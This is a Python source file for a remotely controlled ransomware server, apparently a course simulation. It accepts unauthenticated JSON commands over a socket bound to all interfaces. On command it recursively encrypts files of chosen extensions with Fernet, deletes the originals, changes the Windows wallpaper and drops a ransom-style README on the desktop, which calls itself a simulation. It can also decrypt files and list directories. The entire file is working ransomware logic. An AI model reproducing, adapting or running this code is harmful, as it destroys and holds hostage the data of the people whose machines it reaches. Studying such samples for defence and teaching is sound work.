import socket
import threading
import json
import logging
from colorama import init, Fore, Style
import os
import ctypes

from cryptography.fernet import Fernet

init(autoreset=True)


class ControlServer:
    def __init__(self, host, port, log_file):
        self.host = host
        self.port = port
        self.server = None
        self.setup_logging(log_file)

    def list_files_and_dirs(self, path):
        # Ensure the path exists
        if not os.path.exists(path):
            return f"The path {path} does not exist."

        entries = []
        for entry in os.listdir(path):
            full_path = os.path.join(path, entry)
            if os.path.isdir(full_path):
                entry_type = 'Directory'
            else:
                entry_type = 'File'
            entries.append(f"{entry} - {entry_type}")

        return ', '.join(entries)

    def change_wallpaper(self):
        if os.name == 'nt':
            ctypes.windll.user32.SystemParametersInfoW(20, 0, 'encrypted.png', 0)
        else:
            print("Wallpaper change feature is not supported on this OS.")

    def setup_logging(self, log_file):
        logging.basicConfig(filename=log_file, level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s')

    def encrypt_file(self, key, file_path):
        fernet = Fernet(key)
        with open(file_path, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)

        encrypted_file_path = file_path + ".is613-G6"
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        os.remove(file_path)
        return encrypted_file_path

    def decrypt_file(self, key, file_path):
        fernet = Fernet(key)
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = fernet.decrypt(encrypted_data)

        original_file_path = file_path.replace(".is613-G6", "")
        with open(original_file_path, 'wb') as file:
            file.write(decrypted_data)

        os.remove(file_path)

    def find_and_encrypt_files(self, key, directory, file_extensions):
        encrypted_files = []
        for root, _, files in os.walk(directory):
            for file in files:
                if any(file.endswith(ext) for ext in file_extensions):
                    file_path = os.path.join(root, file)
                    encrypted_file_path = self.encrypt_file(key, file_path)
                    encrypted_files.append(encrypted_file_path)
                    print(f"Encrypted and saved file: {encrypted_file_path}")
        return encrypted_files

    def find_and_decrypt_files(self, key, directory):
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith(".is613-G6"):
                    file_path = os.path.join(root, file)
                    self.decrypt_file(key, file_path)

    def create_readme(self):
        home_path = os.path.expanduser("~")
        if os.name == 'nt':
            home_path = os.environ['USERPROFILE']
        desktop_path = os.path.join(os.path.join(home_path), 'Desktop')
        readme_path = os.path.join(desktop_path, 'README.txt')
        with open(readme_path, 'w') as file:
            file.write("""
!!!!!!!!!! Alert: Simulation Notice !!!!!!!!!! 

This is a simulation.
Your file has been encrypted.
Do not PayNow $888 to 88888888.
Reminder: Always back up your files, activate firewall and stay vigilant against cyber threats.
            """)

    def handle_client(self, connection, address):
        data = connection.recv(1024)
        if not data:
            print(f'No data received from {address}')

        try:
            message = json.loads(data.decode())
            logging.info(f"Data received from {address}: {message}")
            print(f"{Fore.GREEN}Data received: {address}. {message}{Style.RESET_ALL}")

            response = ''

            key = message['key']
            target_directory = message['target_directory']
            file_extensions = message['file_extensions']
            cmd = message['cmd']
            if cmd == 'enc':
                self.find_and_encrypt_files(key, target_directory, file_extensions)
                self.change_wallpaper()
                self.create_readme()
                response = f'Directory "{target_directory}" is encrypted using key {key} for following file extensions: {file_extensions}.'
                print(response)
                logging.info(response)
            elif cmd == 'dec':
                self.find_and_decrypt_files(key, target_directory)
                response = f'Directory "{target_directory}" is decrypted using key {key}.'
                print(response)
                logging.info(response)
            elif cmd == 'list_files':
                response = self.list_files_and_dirs(target_directory)
                print(response)
                logging.info(response)

            connection.sendall(response.encode())
        except json.JSONDecodeError:
            logging.error("Invalid JSON data received.")
        finally:
            connection.close()

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        logging.info(f"{Fore.YELLOW}Server listening at {self.host}:{self.port}.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Server listening at {self.host}:{self.port}{Style.RESET_ALL}")

        try:
            while True:
                connection, address = self.server.accept()
                logging.info(f"Connection established from {address}.")
                print(f"Connection established from {address}")
                client_thread = threading.Thread(target=self.handle_client, args=(connection, address))
                client_thread.start()
        except KeyboardInterrupt:
            logging.info("Shutting down the server.")
            print("Server shut down")
        finally:
            self.server.close()


if __name__ == "__main__":
    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = 12345  # Port number
    LOG_FILE = 'server_log.txt'  # Name of the log file

    control_server = ControlServer(HOST, PORT, LOG_FILE)
    control_server.start()
